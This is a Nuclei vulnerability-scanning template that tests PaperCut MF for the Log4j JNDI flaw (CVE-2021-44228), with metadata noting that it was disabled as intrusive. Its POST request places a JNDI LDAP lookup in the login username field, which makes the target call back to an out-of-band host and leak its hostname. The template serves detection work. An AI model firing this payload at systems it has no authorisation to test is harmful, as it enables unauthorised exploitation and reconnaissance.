id: papercut-log4j-rce
info:
  name: Papercut - Remote Code Execution (Apache Log4j)
  author: shaikhyaser
  severity: critical
  description: |
    Papercut is susceptible to Log4j JNDI remote code execution. Papercut is a print management system.
  reference:
    - https://www.papercut.com/kb/Main/Log4Shell-CVE-2021-44228#product-status
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2021-44228
    cwe-id: CWE-77
    cpe: cpe:2.3:a:papercut:papercut_mf:*:*:*:*:*:*:*:*
  metadata:
    # runzero-match was: any(each(service["html.titles"]), {# matches "Papercut"})
# (disabled: became unrunnable — forbidden tag: intrusive)
# auto-generated by nuclei-sync
    runzero-review: 'REJECT/2026-08-19/auto: became unrunnable — forbidden tag: intrusive'
    max-request: 1
    product: papercut_mf
    shodan-query: title:"Papercut"
    vendor: papercut
  tags: cve,cve2021,intrusive,jndi,kev,log4j,oast,papercut,rce,vuln
variables:
  rand1: '{{rand_int(111, 999)}}'
  rand2: '{{rand_int(111, 999)}}'
  str: '{{rand_base(5)}}'
http:
  - extractors:
      - kval:
          - interactsh_ip
        type: kval
      - group: 2
        part: interactsh_request
        regex:
          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
        type: regex
      - group: 1
        part: interactsh_request
        regex:
          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
        # digest: 4a0a00473045022072bdd2c9b218af8f0dd8e272989d49367d48994c898ba648588cc99fca8f392d022100a3412581e4798e1322ed746c1a15081fab375d5c9196dabf296265549701b63f:922c64590222798bb761d5b6d8e72950

        type: regex
    matchers:
      - part: interactsh_protocol # Confirms the DNS Interaction
        type: word
        words:
          - dns
      - part: interactsh_request
        regex:
          - \d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
        type: regex
    matchers-condition: and
    raw:
      - |
        POST /app HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Referer: {{RootURL}}/app
        Content-Type: application/x-www-form-urlencoded

        service=direct%2F1%2FHome%2F%24Form&sp=S0&Form0=%24Hidden%240%2C%24Hidden%241%2CinputUsername%2CinputPassword%2C%24Submit%240%2C%24PropertySelection&%24Hidden%240=true&%24Hidden%241=X&inputUsername=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&inputPassword=a&%24Submit%240=Log+in&%24PropertySelection=en
